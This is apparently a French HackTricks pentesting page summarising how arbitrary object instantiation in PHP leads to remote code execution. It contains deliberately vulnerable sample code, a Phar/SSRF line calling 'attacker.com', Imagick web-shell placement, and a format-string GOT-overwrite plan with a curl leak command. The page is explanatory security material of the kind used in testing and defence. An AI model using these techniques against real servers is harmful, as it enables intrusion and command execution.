# PHP - RCE en abusant de la création d'objets : new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

Ceci est essentiellement un résumé de [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introduction

La création de nouveaux objets arbitraires, tels que `new $_GET["a"]($_GET["a"])`, peut conduire à Remote Code Execution (RCE), comme détaillé dans un [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Ce document met en avant différentes stratégies pour atteindre une RCE.

## RCE via classes personnalisées ou autoloading

La syntaxe `new $a($b)` est utilisée pour instancier un objet où **`$a`** représente le nom de la classe et **`$b`** est le premier argument passé au constructeur. Ces variables peuvent provenir d'entrées utilisateur comme GET/POST, où elles peuvent être des chaînes ou des tableaux, ou de JSON, où elles peuvent se présenter sous d'autres types.

Considérez l'extrait de code ci‑dessous :
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Dans cet exemple, assigner `$a` à `App` ou `App2` et `$b` à une commande système (par exemple, `uname -a`) entraîne l'exécution de cette commande.

**Autoloading functions** peuvent être exploitées si aucune de ces classes n'est directement accessible. Ces fonctions chargent automatiquement des classes depuis des fichiers lorsque nécessaire et sont définies en utilisant `spl_autoload_register` ou `__autoload` :
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Le comportement de l'autoloading varie selon les versions de PHP, offrant différentes possibilités de RCE.

## RCE via des classes intégrées

Faute de classes personnalisées ou d'autoloaders, **built-in PHP classes** peuvent suffire pour obtenir une RCE. Le nombre de ces classes varie entre 100 et 200, selon la version de PHP et les extensions. Elles peuvent être listées en utilisant `get_declared_classes()`.

Les constructeurs intéressants peuvent être identifiés via la reflection API, comme montré dans l'exemple suivant et le lien [https://3v4l.org/2JEGF].

**Les possibilités de RCE via des méthodes spécifiques incluent :**

### **SSRF + Phar Deserialization**

La classe `SplFileObject` permet le SSRF via son constructeur, autorisant des connexions vers n'importe quelle URL :
```php
new SplFileObject('http://attacker.com/');
```
SSRF peut conduire à des deserialization attacks dans les versions de PHP antérieures à 8.0 en utilisant le protocole Phar.

### **Exploiter les PDOs**

Le constructeur de la classe PDO permet des connexions aux bases de données via des chaînes DSN, pouvant potentiellement permettre la création de fichiers ou d'autres interactions:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Les versions de PHP jusqu'à 5.3.22 et 5.4.12 étaient susceptibles aux attaques XXE via les constructeurs `SoapClient` et `SimpleXMLElement`, selon la version de libxml2.

## RCE via Imagick Extension

Dans l'analyse des **dépendances** d'un projet, il a été découvert que **Imagick** pouvait être exploité pour l'**exécution de commandes** en instanciant de nouveaux objets. Cela offre une opportunité d'exploiter des vulnérabilités.

### VID parser

La capacité du parser VID à écrire du contenu vers n'importe quel chemin spécifié du système de fichiers a été identifiée. Cela pourrait permettre le placement d'un web shell PHP dans un répertoire accessible via le web, obtenant ainsi une Remote Code Execution (RCE).

#### VID Parser + File Upload

Il est noté que PHP stocke temporairement les fichiers uploadés dans `/tmp/phpXXXXXX`. Le parser VID d'Imagick, utilisant le protocole **msl**, peut gérer des caractères génériques dans les chemins de fichiers, facilitant le transfert du fichier temporaire vers un emplacement choisi. Cette méthode offre une approche supplémentaire pour obtenir l'écriture arbitraire de fichiers dans le système de fichiers.

### PHP Crash + Brute Force

Une méthode décrite dans le [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) consiste à uploader des fichiers qui provoquent le crash du serveur avant leur suppression. En brute-forceant le nom du fichier temporaire, il devient possible pour Imagick d'exécuter du code PHP arbitraire. Cependant, cette technique s'est avérée efficace uniquement sur une version obsolète d'ImageMagick.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Lorsque l'entrée utilisateur contrôle le nom de la classe (par ex. `new $_GET['model']()`), PHP 7.0.0 a introduit un bug transitoire lors du refactoring de `Throwable` où le moteur traitait par erreur le nom de la classe comme une chaîne de format pour printf pendant la résolution. Cela permet les primitives classiques de style printf à l'intérieur de PHP : des leaks avec `%p`, le contrôle du compteur d'écriture via des spécificateurs de largeur, et des écritures arbitraires avec `%n` contre des pointeurs en processus (par exemple, des entrées GOT sur les builds ELF).

Exemple minimal reproductible vulnérable:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Plan d'exploitation (d'après la référence) :

- Leak des adresses via `%p` dans le nom de la classe pour trouver une cible écrivable :
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Use positional parameters and width specifiers pour définir un nombre exact d'octets, puis `%n` pour écrire cette valeur à une adresse accessible sur la stack, en visant un slot GOT (par ex., `free`) pour le remplacer partiellement par `system`.
- Déclencher la fonction détournée en passant un nom de classe contenant un shell pipe pour atteindre `system("id")`.

Remarques :
- Fonctionne uniquement sur PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); corrigé dans les versions suivantes. Gravité : critique si l'instantiation arbitraire de classes existe.
- Les payloads typiques enchaînent de nombreux `%p` pour parcourir la stack, puis `%.<width>d%<pos>$n` pour réaliser l'écrasement partiel.

## Références

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
